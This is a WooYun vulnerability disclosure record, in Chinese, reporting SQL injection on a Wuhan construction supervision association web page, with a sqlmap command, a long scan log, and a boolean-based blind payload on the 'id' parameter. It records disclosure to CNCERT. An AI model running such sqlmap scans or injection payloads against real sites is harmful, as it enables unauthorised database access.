{"id": 69917, "wybug_id": "wooyun-2015-0136973", "wybug_title": "武汉建设监理协会某页面存在SQL注入漏洞", "wybug_corp": "武汉建设监理协会", "wybug_author": "linkey", "wybug_date": "2015-08-28 13:06", "wybug_open_date": "2015-10-12 16:40", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-28：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向公众公开  简要描述： 一天三次是我的目标 详细说明：  sqlmap如下:\npython sqlmap.py -u \"http://**.**.**.**/gcxm.asp?id=9704\" --table\n得出：\n[10:34:42] [INFO] testing connection to the target url[10:34:49] [INFO] testing if the url is stable, wait a few seconds[10:34:50] [INFO] url is stable[10:34:50] [INFO] testing if GET parameter 'id' is dynamic[10:34:50] [INFO] confirming that GET parameter 'id' is dynamic[10:34:53] [INFO] GET parameter 'id' is dynamic[10:34:53] [WARNING] heuristic test shows that GET parameter 'id' might not be injectable[10:34:53] [INFO] testing for SQL injection on GET parameter 'id'[10:34:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:35:10] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable [10:35:10] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:35:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[10:35:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[10:35:16] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[10:35:46] [CRITICAL] connection timed out to the target url or proxy, sqlmap is going to retry the request[10:35:51] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:35:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[10:35:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[10:35:58] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:36:02] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[10:36:03] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[10:36:07] [INFO] testing 'Oracle AND time-based blind'[10:36:10] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[10:36:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other injection technique found[10:36:43] [CRITICAL] connection timed out to the target url or proxy, sqlmap is going to retry the request[10:36:43] [WARNING] most probably web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for few minutes and rerun without flag T in option '--technique' (e.g. --flush-session --technique=BEUS) or try to lower the value of option '--time-sec' (e.g. --time-sec=2)[10:37:45] [CRITICAL] connection timed out to the target url or proxy, sqlmap is going to retry the request[10:38:38] [CRITICAL] connection timed out to the target url or proxy, sqlmap is going to retry the request[10:38:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[10:38:40] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using the --dbms option[10:39:14] [WARNING] user aborted during detection phase[10:39:14] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 48 HTTP(s) requests:\n成功了(结果):\n---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=9704 AND 8650=8650---[10:39:24] [INFO] testing MySQL[10:39:24] [WARNING] the back-end DBMS is not MySQL[10:39:24] [INFO] testing Oracle[10:39:25] [WARNING] the back-end DBMS is not Oracle[10:39:25] [INFO] testing PostgreSQL[10:39:25] [WARNING] the back-end DBMS is not PostgreSQL[10:39:25] [INFO] testing Microsoft SQL Server[10:39:37] [WARNING] the back-end DBMS is not Microsoft SQL Server[10:39:37] [INFO] testing SQLite[10:39:37] [WARNING] the back-end DBMS is not SQLite[10:39:37] [INFO] testing Microsoft Access[10:39:37] [INFO] confirming Microsoft Access[10:39:37] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[10:39:37] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'[10:39:37] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'[10:39:37] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[10:39:37] [INFO] retrieved: [10:39:38] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' and/or switch '--hex'[10:39:38] [WARNING] unable to retrieve the number of tables for database 'Microsoft_Access_masterdb'[10:39:38] [ERROR] cannot retrieve table names, back-end DBMS is Access\n   漏洞证明：  \n\n   修复方案：  过滤吧.   版权声明：转载请注明来源 linkey@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-28 16:39 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖北分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}